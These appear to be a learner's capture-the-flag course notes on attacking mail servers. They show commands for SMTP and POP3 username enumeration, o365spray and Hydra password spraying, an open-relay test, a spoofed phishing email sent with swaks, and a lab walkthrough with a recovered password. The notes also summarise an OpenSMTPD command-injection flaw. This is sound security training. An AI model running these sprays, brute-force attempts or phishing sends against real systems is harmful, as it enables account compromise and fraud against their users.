- A `mail server` (sometimes also referred to as an email server) is a server that handles and delivers email over a network, usually over the Internet.
-  The name `SMTP` stands for **Simple Mail Transfer Protocol, and it is a protocol for delivering emails from clients to servers and from servers to other servers.**
- When we **download emails to our email application**, it will connect to a **`POP3` or `IMAP4` server on the Internet, which allows the user to save messages in a server mailbox and download them periodically.**

# Enumeration
---
- [[SMTP]], [[IMAP - POP3]]
- Email servers are complex and usually require us to enumerate multiple servers, ports, and services. Furthermore, today m**ost companies have their email services in the cloud with services such as [Microsoft 365](https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook) or [G-Suite](https://workspace.google.com/solutions/new-business/)**
- We can use the `Mail eXchanger` (`MX`) **DNS record to identify a mail server**.
- The MX record **==specifies the mail server responsible for accepting email messages on behalf of a domain name.==**
- We can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the MX records:
	- `host -t MX hackthebox.eu`
	- `host -t MX microsoft.com`
	- `dig mx plaintext.do | grep "MX" | grep -v ";"`
	- `dig mx inlanefreight.com | grep "MX" | grep -v ";"`
	- `host -t A mail1.inlanefreight.htb.`
- This information is essential because the enumeration methods may differ from one service to another.
- For example, m**ost cloud service providers use their mail server implementation and adopt modern authentication**, which opens **==new and unique attack vectors for each service provider.==** 
- On the other hand, **if the company configures the service**, we could uncover **bad practices and misconfigurations that allow common attacks** on mail server protocols.

- ![[Pasted image 20250712064537.png]]
- `sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128`

# Misconfigurations
---
## Authentication
- The SMTP server has different commands that can be used to enumerate **valid usernames `VRFY`, `EXPN`, and `RCPT TO`**
- If we successfully enumerate valid usernames, we can attempt to password spray.
- **`VRFY`** this command instructs the receiving SMTP server to **check the validity of a particular email username.** The server will respond, indicating if **the user exists or not**. This feature can be disabled:
	- `telnet 10.10.110.20 25`
	- `VRFY root`
		- `252 2.0.0 root`
	- `VRFY www-data`
	- `VRFY new-user`
		- `550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table`
		  
- **`EXPN`** is similar to `VRFY`**, except that when used with a distribution list, it will list all users on that list.**
	- `telnet 10.10.110.20 25`
	- `EXPN john`
	- `EXPN support-team`
		- ![[Pasted image 20250712064808.png]]

- `RCPT TO` **identifies the recipient of the email messag**e. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients:
	- `MAIL FROM:test@htb.com`
		- `Type message body here`
		- `250 2.1.0 test@htb.com... Sender ok`
	- `RCPT TO:kate`
		- `550 5.1.1 kate... User unknown`
	- `RCPT TO:john`
		- `250 2.1.5 john... Recipient ok`

- We can also use the **`POP3` protocol to enumerate users depending on the service implementation**
- For example, we can use the **command `USER` followed by the username, and if the server responds `OK`.**:
	- `telnet 10.10.110.20 110`
	- `USER julio`
		- `-ERR`
	- `USER john`
		- `+OK`

- To automate our enumeration process, we can **use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)**.
- We can specify the **enumeration mode with the argument `-M`** followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate:
	- `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`

# Cloud Enumeration
---
- Let's use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.
- **[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365)** developed by [ZDH](https://twitter.com/0xzdh). 
- This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments). Let's first validate if our target domain is using Office 365

- O365 Spray:
	- `python3 o365spray.py --validate --domain msplaintext.xyz`
		- `[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz`
- Now, we can attempt to identify usernames.
	- `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`
	- ![[Pasted image 20250712065240.png]]

# Password Attacks
---
- We can use `Hydra` to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`.
	- `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`
- If cloud services support SMTP, POP3, or IMAP4 protocols, **we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked.**

- We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta.
- Keep in mind that **these tools need to be up-to-date because if the service provider changes something** (which happens often), the tools may not work anymore.

- O365 Spray - Password Spraying:
	- `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`
	- ![[Pasted image 20250712065418.png]]
- Any **unknown error can mean login was success** 

# Protocol Specifics Attacks
---
- An open relay is a **Simple Mail Transfer Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay.**
- Messaging servers that are **accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server.**

## Open Relay
- From an attacker's standpoint, we can **abuse this for phishing by sending emails as non-existing users or spoofing someone else's email**
- With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay:
	- `nmap -p25 -Pn --script smtp-open-relay 10.10.11.213`
		- `25/tcp open  smtp`
		`smtp-open-relay: Server is an open relay (14/16 tests)`

- Next, we can use any mail client to connect to the mail server and send our email:
	- `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213`

# Labs
---
=> What is the available username for the domain inlanefreight.htb in the SMTP server? 
- Bruteforce login Username:
	- `smtp-user-enum -M RCPT -U users.list  -D inlanefreight.htb -t 10.129.83.172`
- Password:
	- `hydra -l marlin@inlanefreight.htb -P pws.list -f 10.129.83.172 pop3 -I`
	- ![[Pasted image 20250712074102.png]]
- Access using pop3:
	- `telnet 10.129.83.172 110`
	- `USER marlin@inlanefreight.htb`
	- `PASS poohbear`
	- `LIST`
	- `RETR 1`

		![[Pasted image 20250712074148.png]]

# Latest Email Service Vulnerabilities
---
- One of the most recent publicly disclosed and dangerous [Simple Mail Transfer Protocol (SMTP)](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol) vulnerabilities was discovered in [OpenSMTPD](https://www.opensmtpd.org/) up to version 6.6.2 service was in 2020.
- This vulnerability was assigned [CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247) and **leads to RCE.**
- The dangerous thing about this vulnerability is the possibility of executing system commands remotely on the system **and that exploiting this vulnerability does not require authentication.**
- According to [Shodan.io](https://www.shodan.io), at the time of writing (April 2022), there are over **5,000 publicly accessible OpenSMTPD servers worldwide**, and the trend is growing.

## The Concept of the Attack
- The **vulnerability in this service lies in the program's code**, namely in the function that records the sender's email address.
- This offers the possibility of **escaping the function using a semicolon (`;`) and making the system execute arbitrary shell commands.**
- However, there is a limit of 64 characters, which can be inserted as a command.
- ![[Pasted image 20250712074426.png]]
- An [exploit](https://www.exploit-db.com/exploits/47984) has been published on the [Exploit-DB](https://www.exploit-db.com) platform for this vulnerability which can be used for more detailed analysis and the functionality of the trigger for the execution of system commands.
